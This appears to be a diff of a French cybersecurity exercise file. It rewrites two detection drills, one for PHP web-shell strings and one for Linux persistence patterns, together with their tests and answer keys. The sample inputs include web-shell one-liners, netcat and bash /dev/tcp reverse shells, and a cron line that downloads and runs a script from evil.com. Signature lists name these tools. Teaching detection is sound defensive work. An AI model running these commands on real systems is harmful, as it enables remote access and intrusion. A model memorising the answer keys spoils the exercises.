@@ -4,82 +4,81 @@ module.exports = [
   {
     "id": "hk3-c6-e1",
     "chapter": 6,
-    "title": "Détecteur de Web Shells et Obfuscation de Scripts Malveillants",
+    "title": "Recherche illustrative de signatures textuelles",
     "level": "n1",
     "language": "analyse",
-    "goal": "Analyser le code d'un script web pour repérer la présence de web shells et de mécanismes d'obfuscation.",
-    "brief": "<p>Un web shell est un script déposé sur un serveur permettant à l'attaquant d'exécuter des commandes système à distance.<br><br>\nIndicateurs recherchés et scoring de dangerosité :<br>\n- Exécution de commandes système (<code>system</code>, <code>passthru</code>, <code>shell_exec</code>, <code>popen</code>) : +40 points.<br>\n- Évaluation dynamique de code (<code>eval</code>, <code>assert</code>) : +30 points.<br>\n- Fonctions d'obfuscation (<code>base64_decode</code>, <code>gzinflate</code>, <code>str_rot13</code>) : +20 points.<br>\n- Réception directe d'entrées non filtrées (<code>$_GET</code>, <code>$_POST</code>, <code>$_REQUEST</code>) : +20 points.<br><br>\nClassification finale :<br>\n- Si <code>score &gt;= 60</code> : <code>status=MALICIOUS_WEBSHELL</code>, <code>risk=CRITICAL</code>.<br>\n- Si <code>20 &lt;= score &lt; 60</code> : <code>status=SUSPICIOUS_SCRIPT</code>, <code>risk=MEDIUM</code>.<br>\n- Si <code>score &lt; 20</code> : <code>status=BENIGN_CODE</code>, <code>risk=LOW</code>.<br><br>\nDonnées du cas : <code>SCAN_SCRIPT code=&lt;extrait_de_code&gt;</code>.<br>\nRésultat d’analyse attendu : <code>WEBSHELL_SCAN: score=&lt;score&gt; status=&lt;status&gt; risk=&lt;risk&gt;</code>.</p>",
-    "starter": "# Grille d'analyse (hk3-c6-e1) — Détecteur de Web Shells et Obfuscation de Scripts Malveillants\n# Complétez la résolution demandée sous chaque cas ci-dessous :\n\n[Cas 1 — Web shell fortement obfusqué combinant eval, base64 et entrées POST]\n# Données : SCAN_SCRIPT code=<?php eval(base64_decode($_POST[\"payload\"])); ?>\nA_COMPLETER\n\n[Cas 2 — Script suspect utilisant uniquement base64_decode]\n# Données : SCAN_SCRIPT code=<?php $logo = base64_decode(\"iVBORw0KGgoAAAANSUhEUg==\"); ?>\nA_COMPLETER\n\n[Cas 3 — Script légitime de template sans fonction dangereuse]\n# Données : SCAN_SCRIPT code=<?php echo \"<h1>Bienvenue sur le portail</h1>\"; ?>\nA_COMPLETER\n",
+    "goal": "Relever des familles de chaînes sans certifier la nature ou le risque d’un script.",
+    "brief": "<p>Ce modèle recherche uniquement des chaînes littérales et additionne une fois chaque famille présente : commandes (<code>system</code>, <code>passthru</code>, <code>shell_exec</code>, <code>popen</code>) +40 ; évaluation (<code>eval</code>, <code>assert</code>) +30 ; transformations (<code>base64_decode</code>, <code>gzinflate</code>, <code>str_rot13</code>) +20 ; entrées (<code>$_GET</code>, <code>$_POST</code>, <code>$_REQUEST</code>) +20. Le score et les seuils sont fictifs : une correspondance n’établit pas une malveillance et l’absence d’indice ne prouve pas l’innocuité. Une analyse complémentaire est nécessaire.</p><p>Pour <code>SCAN_SCRIPT code=&lt;texte&gt;</code>, afficher <code>WEBSHELL_SCAN: score=&lt;n&gt; status=&lt;INDICES_FORTS|INDICES|AUCUN_INDICE&gt; risk=NON_EVALUE</code> : INDICES_FORTS à partir de 60, INDICES de 20 à 59, AUCUN_INDICE en dessous de 20.</p>",
+    "starter": "# Grille d'analyse (hk3-c6-e1) — Recherche illustrative de signatures textuelles\n# Complétez la réponse attendue sous chaque cas ci-dessous :\n\n[Cas 1 — Trois familles textuelles]\n# Données : SCAN_SCRIPT code=<?php eval(base64_decode($_POST[\"payload\"])); ?>\nA_COMPLETER\n\n[Cas 2 — Une seule famille textuelle]\n# Données : SCAN_SCRIPT code=<?php $logo = base64_decode(\"iVBORw0KGgoAAAANSUhEUg==\"); ?>\nA_COMPLETER\n\n[Cas 3 — Aucune des chaînes recherchées]\n# Données : SCAN_SCRIPT code=<?php echo \"<h1>Bienvenue sur le portail</h1>\"; ?>\nA_COMPLETER\n",
     "hints": [
-      "Extrayez le code après \"code=\" avec l’extraction des champs[1].",
-      "Testez la présence des différentes familles de mots-clés.",
-      "Attribuez la classification selon les seuils 60 et 20."
+      "Compter chaque famille au maximum une fois.",
+      "Le résultat ne classe pas le script comme bénin ou malveillant."
     ],
     "examples": [
       {
         "stdin": "SCAN_SCRIPT code=<?php if(isset($_REQUEST[\"cmd\"])){ system($_REQUEST[\"cmd\"]); } ?>",
-        "expected": "WEBSHELL_SCAN: score=60 status=MALICIOUS_WEBSHELL risk=CRITICAL",
-        "note": "Web shell PHP classique à une ligne combinant system et $_REQUEST."
+        "expected": "WEBSHELL_SCAN: score=60 status=INDICES_FORTS risk=NON_EVALUE",
+        "note": "Deux familles sont présentes dans le texte ; le score ne remplace pas l’analyse."
       }
     ],
     "tests": [
       {
-        "label": "Web shell fortement obfusqué combinant eval, base64 et entrées POST",
+        "label": "Trois familles textuelles",
         "stdin": "cas:1",
-        "expected": "WEBSHELL_SCAN: score=70 status=MALICIOUS_WEBSHELL risk=CRITICAL"
+        "expected": "WEBSHELL_SCAN: score=70 status=INDICES_FORTS risk=NON_EVALUE"
       },
       {
-        "label": "Script suspect utilisant uniquement base64_decode",
+        "label": "Une seule famille textuelle",
         "stdin": "cas:2",
-        "expected": "WEBSHELL_SCAN: score=20 status=SUSPICIOUS_SCRIPT risk=MEDIUM"
+        "expected": "WEBSHELL_SCAN: score=20 status=INDICES risk=NON_EVALUE"
       },
       {
-        "label": "Script légitime de template sans fonction dangereuse",
+        "label": "Aucune des chaînes recherchées",
         "stdin": "cas:3",
-        "expected": "WEBSHELL_SCAN: score=0 status=BENIGN_CODE risk=LOW"
+        "expected": "WEBSHELL_SCAN: score=0 status=AUCUN_INDICE risk=NON_EVALUE"
       }
     ],
-    "solution": "[Exemple]\nWEBSHELL_SCAN: score=60 status=MALICIOUS_WEBSHELL risk=CRITICAL\n\n[Cas 1 — Web shell fortement obfusqué combinant eval, base64 et entrées POST]\nWEBSHELL_SCAN: score=70 status=MALICIOUS_WEBSHELL risk=CRITICAL\n\n[Cas 2 — Script suspect utilisant uniquement base64_decode]\nWEBSHELL_SCAN: score=20 status=SUSPICIOUS_SCRIPT risk=MEDIUM\n\n[Cas 3 — Script légitime de template sans fonction dangereuse]\nWEBSHELL_SCAN: score=0 status=BENIGN_CODE risk=LOW"
+    "solution": "[Exemple]\nWEBSHELL_SCAN: score=60 status=INDICES_FORTS risk=NON_EVALUE\n\n[Cas 1 — Trois familles textuelles]\nWEBSHELL_SCAN: score=70 status=INDICES_FORTS risk=NON_EVALUE\n\n[Cas 2 — Une seule famille textuelle]\nWEBSHELL_SCAN: score=20 status=INDICES risk=NON_EVALUE\n\n[Cas 3 — Aucune des chaînes recherchées]\nWEBSHELL_SCAN: score=0 status=AUCUN_INDICE risk=NON_EVALUE\n"
   },
   {
     "id": "hk3-c6-e2",
     "chapter": 6,
-    "title": "Analyseur de Persistance Linux (Crontab & Reverse Shells)",
+    "title": "Recherche de motifs de persistance Linux",
     "level": "n2",
     "language": "analyse",
-    "goal": "Auditer les mécanismes de persistance et détecter les commandes de shell inverse (Reverse Shell).",
-    "brief": "<p>Après obtention d'un accès initial, l'attaquant configure une tâche planifiée ou un script de démarrage pour maintenir sa connexion.<br><br>\nSignatures d'attaques surveillées :<br>\n1. <code>BASH_REVERSE_SHELL</code> : contient <code>/dev/tcp/</code> ou <code>bash -i</code>.<br>\n2. <code>NETCAT_REVERSE_SHELL</code> : contient <code>nc -e</code>, <code>ncat -e</code> ou <code>nc.traditional</code>.<br>\n3. <code>DOWNLOAD_EXECUTE</code> : contient <code>curl</code> ou <code>wget</code> suivi de <code>| sh</code> ou <code>| bash</code>.<br>\n4. <code>PYTHON_SOCKET_SHELL</code> : contient <code>python -c</code> et <code>socket</code>.<br><br>\nRègles de diagnostic :<br>\n- Si l'une des signatures est présente :<br>\n  <code>malicious=TRUE</code>, <code>signature=&lt;NOM_SIGNATURE&gt;</code>, <code>risk=CRITICAL</code>.<br>\n- Sinon :<br>\n  <code>malicious=FALSE</code>, <code>signature=CLEAN</code>, <code>risk=LOW</code>.<br><br>\nDonnées du cas : <code>PERSIST_AUDIT type=&lt;CRON|SERVICE|SCRIPT&gt; command=&lt;commande&gt;</code>.<br>\nRésultat d’analyse attendu : <code>PERSIST_RESULT: type=&lt;type&gt; malicious=&lt;TRUE|FALSE&gt; signature=&lt;sig&gt; risk=&lt;risk&gt;</code>.</p>",
-    "starter": "# Grille d'analyse (hk3-c6-e2) — Analyseur de Persistance Linux (Crontab & Reverse Shells)\n# Complétez la résolution demandée sous chaque cas ci-dessous :\n\n[Cas 1 — Reverse shell netcat avec redirection de binaire shell]\n# Données : PERSIST_AUDIT type=SERVICE command=ExecStart=/bin/nc -e /bin/sh 192.168.1.100 9001\nA_COMPLETER\n\n[Cas 2 — Persistance par téléchargement et exécution de script distant]\n# Données : PERSIST_AUDIT type=CRON command=@reboot curl -s http://evil.com/implant.sh | bash\nA_COMPLETER\n\n[Cas 3 — Tâche cron légitime de sauvegarde et synchronisation]\n# Données : PERSIST_AUDIT type=CRON command=0 2 * * * /usr/bin/rsync -avz /data /backup\nA_COMPLETER\n",
+    "goal": "Repérer des motifs textuels associés à des techniques de persistance, sans conclure sur leur intention ou leur risque.",
+    "brief": "<p>Une tâche planifiée ou un script de démarrage peut être utilisé pour maintenir un accès. Cette grille recherche uniquement quatre motifs textuels dans une commande ; elle ne lance aucune commande.<br><br>\nMotifs recherchés, par ordre de priorité :<br>\n1. <code>BASH_REVERSE_SHELL</code> : contient <code>/dev/tcp/</code> ou <code>bash -i</code>.<br>\n2. <code>NETCAT_REVERSE_SHELL</code> : contient <code>nc -e</code>, <code>ncat -e</code> ou <code>nc.traditional</code>.<br>\n3. <code>DOWNLOAD_EXECUTE</code> : contient <code>curl</code> ou <code>wget</code> suivi de <code>| sh</code> ou <code>| bash</code>.<br>\n4. <code>PYTHON_SOCKET_SHELL</code> : contient <code>python -c</code> et <code>socket</code>.<br><br>\nIndiquez le premier motif trouvé, ou <code>signature=AUCUNE_CORRESPONDANCE</code> si aucun ne correspond. Une correspondance ne prouve ni l'intention malveillante ni le niveau de risque ; son absence ne prouve pas non plus l'innocuité. Dans les deux cas, renseignez <code>malicious=NON_EVALUE</code> et <code>risk=NON_EVALUE</code> : une analyse complémentaire est nécessaire.<br><br>\nDonnées du cas : <code>PERSIST_AUDIT type=&lt;CRON|SERVICE|SCRIPT&gt; command=&lt;commande&gt;</code>.<br>\nRésultat d’analyse attendu : <code>PERSIST_RESULT: type=&lt;type&gt; malicious=NON_EVALUE signature=&lt;sig&gt; risk=NON_EVALUE</code>.</p>",
+    "starter": "# Grille d'analyse (hk3-c6-e2) — Recherche de motifs de persistance Linux\n# Complétez la résolution demandée sous chaque cas ci-dessous :\n\n[Cas 1 — Reverse shell netcat avec redirection de binaire shell]\n# Données : PERSIST_AUDIT type=SERVICE command=ExecStart=/bin/nc -e /bin/sh 192.168.1.100 9001\nA_COMPLETER\n\n[Cas 2 — Persistance par téléchargement et exécution de script distant]\n# Données : PERSIST_AUDIT type=CRON command=@reboot curl -s http://evil.com/implant.sh | bash\nA_COMPLETER\n\n[Cas 3 — Tâche cron de sauvegarde et synchronisation]\n# Données : PERSIST_AUDIT type=CRON command=0 2 * * * /usr/bin/rsync -avz /data /backup\nA_COMPLETER\n",
     "hints": [
-      "Extrayez la commande avec l’extraction des champs[1].",
+      "Repérez le type après type= et la commande après command=.",
       "Testez les motifs BASH_REVERSE_SHELL, NETCAT_REVERSE_SHELL, DOWNLOAD_EXECUTE, PYTHON_SOCKET_SHELL.",
       "Formatez la sortie PERSIST_RESULT."
     ],
     "examples": [
       {
         "stdin": "PERSIST_AUDIT type=CRON command=* * * * * /bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
-        "expected": "PERSIST_RESULT: type=CRON malicious=TRUE signature=BASH_REVERSE_SHELL risk=CRITICAL",
-        "note": "Tâche cron récurrente établissant un reverse shell interactif vers l'attaquant."
+        "expected": "PERSIST_RESULT: type=CRON malicious=NON_EVALUE signature=BASH_REVERSE_SHELL risk=NON_EVALUE",
+        "note": "La commande contient les motifs textuels de la famille BASH_REVERSE_SHELL."
       }
     ],
     "tests": [
       {
         "label": "Reverse shell netcat avec redirection de binaire shell",
         "stdin": "cas:1",
-        "expected": "PERSIST_RESULT: type=SERVICE malicious=TRUE signature=NETCAT_REVERSE_SHELL risk=CRITICAL"
+        "expected": "PERSIST_RESULT: type=SERVICE malicious=NON_EVALUE signature=NETCAT_REVERSE_SHELL risk=NON_EVALUE"
       },
       {
         "label": "Persistance par téléchargement et exécution de script distant",
         "stdin": "cas:2",
-        "expected": "PERSIST_RESULT: type=CRON malicious=TRUE signature=DOWNLOAD_EXECUTE risk=CRITICAL"
+        "expected": "PERSIST_RESULT: type=CRON malicious=NON_EVALUE signature=DOWNLOAD_EXECUTE risk=NON_EVALUE"
       },
       {
-        "label": "Tâche cron légitime de sauvegarde et synchronisation",
+        "label": "Tâche cron de sauvegarde et synchronisation",
         "stdin": "cas:3",
-        "expected": "PERSIST_RESULT: type=CRON malicious=FALSE signature=CLEAN risk=LOW"
+        "expected": "PERSIST_RESULT: type=CRON malicious=NON_EVALUE signature=AUCUNE_CORRESPONDANCE risk=NON_EVALUE"
       }
     ],
-    "solution": "[Exemple]\nPERSIST_RESULT: type=CRON malicious=TRUE signature=BASH_REVERSE_SHELL risk=CRITICAL\n\n[Cas 1 — Reverse shell netcat avec redirection de binaire shell]\nPERSIST_RESULT: type=SERVICE malicious=TRUE signature=NETCAT_REVERSE_SHELL risk=CRITICAL\n\n[Cas 2 — Persistance par téléchargement et exécution de script distant]\nPERSIST_RESULT: type=CRON malicious=TRUE signature=DOWNLOAD_EXECUTE risk=CRITICAL\n\n[Cas 3 — Tâche cron légitime de sauvegarde et synchronisation]\nPERSIST_RESULT: type=CRON malicious=FALSE signature=CLEAN risk=LOW"
+    "solution": "[Exemple]\nPERSIST_RESULT: type=CRON malicious=NON_EVALUE signature=BASH_REVERSE_SHELL risk=NON_EVALUE\n\n[Cas 1 — Reverse shell netcat avec redirection de binaire shell]\nPERSIST_RESULT: type=SERVICE malicious=NON_EVALUE signature=NETCAT_REVERSE_SHELL risk=NON_EVALUE\n\n[Cas 2 — Persistance par téléchargement et exécution de script distant]\nPERSIST_RESULT: type=CRON malicious=NON_EVALUE signature=DOWNLOAD_EXECUTE risk=NON_EVALUE\n\n[Cas 3 — Tâche cron de sauvegarde et synchronisation]\nPERSIST_RESULT: type=CRON malicious=NON_EVALUE signature=AUCUNE_CORRESPONDANCE risk=NON_EVALUE"
   },
   {
     "id": "hk3-c6-e3",
